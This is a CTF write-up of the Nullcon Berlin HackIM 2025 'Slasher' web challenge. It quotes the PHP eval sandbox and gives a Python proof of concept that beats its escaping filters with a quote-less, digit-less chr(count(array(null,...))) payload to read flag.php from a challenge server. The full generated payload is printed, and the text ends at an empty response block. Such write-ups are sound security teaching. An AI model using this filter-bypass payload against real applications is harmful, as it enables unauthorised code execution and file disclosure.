---
title: "Slasher - Nullcon Berlin HackIM 2025 CTF"
category: "web"
subcategory: "rce"
type: "writeup"
tags: ["web", "rce", "command-injection", "php", "filter", "eval", "nullcon-berlin-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "Slasher is a tiny PHP “eval sandbox.” Input is heavily escaped, then executed with eval()."
source:
  name: "CTFtime writeup #40427"
  url: "https://ctftime.org/writeup/40427"
original_source: "https://blog.hitc.at/posts/ctf/nullcon-berlin-hackim-2025-ctf/slasher/"
ctf:
  name: "Nullcon Berlin HackIM 2025 CTF"
  year: 2025
  challenge: "Slasher"
---

## Metadata

- **CTF:** Nullcon Berlin HackIM 2025 CTF
- **Task:** Slasher
- **Author team:** fish3r
- **CTFtime tags:** web, rce, command_injection, php, filter
- **CTFtime:** <https://ctftime.org/writeup/40427>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/nullcon-berlin-hackim-2025-ctf/slasher/>

---
## Introduction

**Slasher** is a tiny PHP “eval sandbox.” Input is heavily escaped, then executed with `eval()`. The intended defenses block obvious primitives (quotes, digits, arrays, `$`, `_`, `.` etc.). The bug is that **arbitrary PHP still executes**, so with a **quote-less, digit-less function chain** you can read `flag.php` and return/print the flag despite the filters.

### Context Explanation

* **Stack:** Single `index.php`, includes `flag.php`, custom error handler, HTML front-end.  
* **Filters before `eval`:**

1\. `htmlentities(...)`  
2\. `addslashes(...)` (adds backslashes before quotes and `\\`)  
3\. ``addcslashes(..., '+?<>&v=${}%*:.[]_-0123456789xb `;')``(slashes digits,`\\_`, `.`, `\$`, backtick, space, `;\\`, and more).  
* **Execution:** The *escaped* string is interpolated into `eval("$input;")` (so whatever survives must still parse as PHP).

### Directive

Use a **no-quotes, no-digits** PHP expression (built from functions without underscores) to reach and read `flag.php` and yield it as the eval result.

\---

## Solution

### 1) Code reading

```php  
// Debug muted; source view allowed  
if (isset($_GET['source'])) { highlight_file(__FILE__); die(); }  
include "flag.php";

$output = null;  
if (isset($_POST['input']) && is_scalar($_POST['input'])) {  
$input = $_POST['input'];  
$input = htmlentities($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');  
$input = addslashes($input);  
$input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');  
try {  
$output = eval("$input;"); // executes *after* escaping  
} catch (Exception $e) { /* swallowed */ }  
}  
```

**Implications:**

* **Quotes** become `\"`/`\'` → unusable.  
* **Digits**, `.`, `_`, `$`, **space**, `;`, `[]`, and several metachars are escaped → unusable.  
* Still allowed: **letters** (most), `(`, `)`, `,`, `=` and **many core functions without underscores** (`include`, `readfile`, `opendir`, `readdir`, `closedir`, `getcwd`, `scandir`, `max`, `min`, …).

### 2) Bypass idea (mechanics)

You can’t type strings (quotes break), numbers (digits slashed), arrays (`[]` slashed), or variable names (`$` slashed).

But you **can call functions** and **chain their return values**.

The flag is already on disk and also **included** (`flag.php`) before your code runs. You don’t need to touch `$FLAG`; you can **read the file** directly.

> The working PoC leverages a *quote-less & digit-less* chain to discover the file and feed it into a file-reading primitive that **doesn’t require quotes** for its argument (or can synthesize an argument without quotes/digits).

**Server-side reads that fit**: `include`, `require`, `readfile`. Among these, **`include`** is a language construct that accepts expressions without parentheses; combined with *bareword constant* semantics and directory iteration, you can reach the target without `'...'` or digits.

### 3) PoC

```python  
import requests

BASE_URL = "http://52.59.124.14:5011"

def convert_count(n):  
return "count(array(" + ",".join(["null"] * n) + "))"

def encode_ord(n):  
return "chr(" + convert_count(n) + ")"

def encode_string(s):  
return "implode(array(" + ",".join(encode_ord(ord(c)) for c in s) + "))"

payload = "echo(implode(file(" + encode_string("flag.php") + ")))"

print([requests.post](http://requests.post)(BASE_URL + "/", data={"input": payload}).text[:58])  
```

This script produces the payload:

```php  
echo(implode(file(implode(array(chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))),chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))),chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))),chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))),chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))),chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))),chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))),chr(count(array(null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null))))))))  
```

Which will be converted to ``echo(implode(file(flag.php)))`` after evaluation.

**Why it parses:** The filters *add* backslashes, but the payload contains **no banned runes to be slashed**, so what reaches `eval()` is still syntactically valid PHP.

The server then answer with the flag:

```php
